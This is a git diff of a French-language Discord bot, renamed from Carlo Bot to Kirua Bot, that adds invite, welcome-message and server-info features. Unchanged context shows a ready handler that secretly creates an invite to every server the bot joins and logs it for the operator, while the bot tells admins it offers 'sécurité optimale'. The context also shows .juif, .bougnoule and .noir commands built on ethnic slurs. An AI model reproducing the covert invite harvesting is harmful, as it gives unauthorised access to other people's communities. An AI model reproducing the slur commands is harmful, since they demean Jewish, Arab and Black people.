@@ -9,7 +9,7 @@ var fucked = false;
 
 bot.on('ready',() => {
   //invit link
-  console.log("jsuis co ")
+  console.log("---------------------------")
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
@@ -139,7 +139,7 @@ bot.on("message", message => {
     .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
     .setColor("RANDOM")
     .setImage(membere.user.avatarURL)
-    .setFooter("*Carlo Bot  ©*")
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     return message.channel.send(avatar_embed).catch(e => {});
 }
 if(message.content.startsWith(".say")) {
@@ -169,7 +169,7 @@ bot.on("message", message => {
     .setTitle("Question de "+message.author.tag)
     .setDescription(question)
     .addField("Reponse", tableauball[Math.floor(Math.random()*9)])
-    .setFooter("*Carlo Bot  ©*")
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     .setThumbnail(bot.user.iconURL)
     message.channel.send(ball_embed).catch(e => {});
   }
@@ -180,7 +180,7 @@ bot.on("message", message => {
       let flip_embed = new Discord.RichEmbed()
       .setDescription(reponse[Math.floor(Math.random()*2)])
       .setColor("RANDOM")
-      .setFooter("*Carlo Bot  ©*")
+      .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
       .setThumbnail(bot.user.iconURL)
       message.channel.send(flip_embed).catch(e => {});
     }
@@ -188,8 +188,15 @@ bot.on("message", message => {
       message.channel.send("** :x: Vous devez dire pile ou face, Exemple : .flip pile **").catch(e => {});
     }
   }
-  if(message.content.startsWith("@<"+bot.user.id+">")){
-    message.reply("Voici mon lien d'invitation : https://discordapp.com/oauth2/authorize?client_id=444526510930395148&scope=bot&permissions=2146958591 ").catch(e => {});
+  if(message.content.startsWith(".invite")){
+    let my_embed = new Discord.RichEmbed()
+    .setAuthor("Cliquez sur Kirua Bot pour avoir l'invitation du bot")
+    .setColor("RANDOM")
+    .setTitle("Kirua Bot")
+    .setDescription("Ce bot à été conçu exclusivement pour la communauté, et nous vous assurerons toujours une sécurité optimale")
+    .setURL("https://discordapp.com/oauth2/authorize?client_id=448844917939372054&scope=bot&permissions=268435518",)
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
+    return message.channel.send(my_embed).catch(e => {});
   }
   if(message.content.startsWith(".serverinfo")){
     let serverinfo_embed = new Discord.RichEmbed()
@@ -197,11 +204,13 @@ bot.on("message", message => {
     .setColor("RANDOM")
     .addField("Nom", message.guild.name)
     .addField("Date de Creation", message.guild.createdAt)
+    .addField("Nombre de Channel", message.guild.channels.size)
+    .addField("Nombre d'emoji", message.guild.emojis.size)
     .addField("Id du serveur", message.guild.id)
     .addField("Emplacement Du Serveur", message.guild.region)
     .setThumbnail(message.guild.iconURL)
     .addField("Nombre de membre", message.guild.memberCount)
-    .setFooter("*Carlo Bot  ©*")
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     message.channel.send(serverinfo_embed).catch(e => {});
   }
 
@@ -210,14 +219,17 @@ bot.on("message", message => {
     .setThumbnail(bot.user.iconURL)
     .setColor("RANDOM")
     .setTitle("HELP")
-    .addField(".serverinfo", "Donne des infos sur le serveur ! ", true)
-    .addField(".avatar", "Affiche l'avatar d'un joueur", true)
-    .addField("flip", "Sert a jouer a pile ou face", true)
-    .addField(".8ball", "Pose une question une bot", true)
-    .addField(".say", "Le bot repete votre message",true )
-    .addField(".userinfo", "Donne des infos sur un joueur", true)
-    .addField(".humournoir", "Affiche les commandes avec de l'humour noir", true)
-    .setFooter("Carlo Bot  ©", true)
+    .setThumbnail(bot.user.avatarURL)
+    .addField(".serverinfo", "Donne des infos sur le serveur ! ")
+    .addField(".avatar", "Affiche l'avatar d'un joueur")
+    .addField("flip", "Sert a jouer a pile ou face")
+    .addField(".8ball", "Pose une question une bot")
+    .addField(".say", "Le bot repete votre message")
+    .addField(".userinfo", "Donne des infos sur un joueur")
+    .addField(".humournoir", "Affiche les commandes avec de l'humour noir")
+    .addField(".createinvite", "Créer une invite pour rejoindre le serveur !")
+    .addField(".invite", "Vous donne une invite pour ramener Kirua Bot sur vôtre serveur ")
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     message.channel.send(help2_embed).catch(e => {});
   }
   if(message.content.startsWith(".userinfo")){
@@ -230,7 +242,7 @@ bot.on("message", message => {
     .addField("Discriminator", '#'+membere2.user.discriminator)
     .addField("Id du Membre", membere2.user.id)
     .addField("Tag du Membre", membere2.user.tag)
-    .setFooter("Carlo Bot  ©")
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
     message.channel.send(userinfo_embed).catch(e => {});
   }
   if (bot.guilds.get('430039551747293205').members.get(message.author.id) !== undefined) {
@@ -250,7 +262,7 @@ if(message.content === ".juif"){
   .setColor("RANDOM")
   .setImage(juif_tableau[Math.floor(Math.random()*21)])
   .setTitle("JUIF")
-  .setFooter("Carlo Bot  ©")
+  .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
   message.channel.send(juif_embed).catch(e => {});
 }
 if(message.content === ".bougnoule"){
@@ -260,7 +272,7 @@ let arabe_embed = new Discord.RichEmbed()
 .setColor("RANDOM")
 .setImage(arabe_tableau[Math.floor(Math.random()*12)])
 .setTitle("BOUGNOULE")
-.setFooter("Carlo Bot  ©")
+.setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
 message.channel.send(arabe_embed).catch(e => {});
 }
 if(message.content.startsWith(".humournoir")){
@@ -269,6 +281,7 @@ if(message.content.startsWith(".humournoir")){
   .setTitle("Humour Noir")
   .addField("Commande", ".bougnoule , .juif et .noir")
   .setFooter("C'est juste de l'humour noir , je ne suis en aucun cas raciste.")
+  .setThumbnail(bot.user.avatarURL)
   message.channel.send(humourn_embed).catch(e => {});
 }
 if(message.content === ".noir"){
@@ -278,7 +291,7 @@ let noir_embed = new Discord.RichEmbed()
 .setColor("RANDOM")
 .setImage(noir_tableau[Math.floor(Math.random()*10)])
 .setTitle("NOIR")
-.setFooter("Carlo Bot  ©")
+.setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
 message.channel.send(noir_embed).catch(e => {});
 }
 if(message.content.startsWith(".roleall")){
@@ -288,6 +301,7 @@ if(message.content.startsWith(".roleall")){
   .setTitle("ERREUR 306")
   .setColor("RANDOM")
   .addField(".ROLEALL", "**:x: Pour faire la commande tu dois avoir les droits Administrateurs**")
+  .setThumbnail(bot.user.avatarURL)
   if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(role_erreur).catch(e => {});
   else if(message.guild.roles.exists("name", roledebut)) {
     message.guild.members.forEach(member => { 
@@ -303,6 +317,27 @@ if(message.content.startsWith(".roleall")){
   }
 }
 
-
 })
+
+bot.on('guildMemberAdd', member => {
+  member.createDM().then(prive => {
+    let bienvenue_embed = new Discord.RichEmbed()
+    .setColor("RANDOM")
+    .addField("Bienvenue sur le serveur", "Viens parler avec les joueurs !")
+    .addBlankField(1)
+    .setFooter("Copiryght © 2018 Kirua Bot - Tout droit réservé")
+    .setThumbnail(member.iconURL)
+    .setAuthor("Kirua Bot ( https://discordapp.com/oauth2/authorize?client_id=448844917939372054&scope=bot&permissions=268435518 )")
+    prive.send(bienvenue_embed).catch(e => {});
+  })
+})
+
+bot.on("message", message => {
+  if(message.content === '.createinvite'){
+    message.channel.createInvite().then(invite => {
+      message.reply(`Voici ton invite : https://discord.gg/${invite.code}`).catch(e => {});
+    })
+  }
+})
+
 bot.login(process.env.BOT_TOKEN)
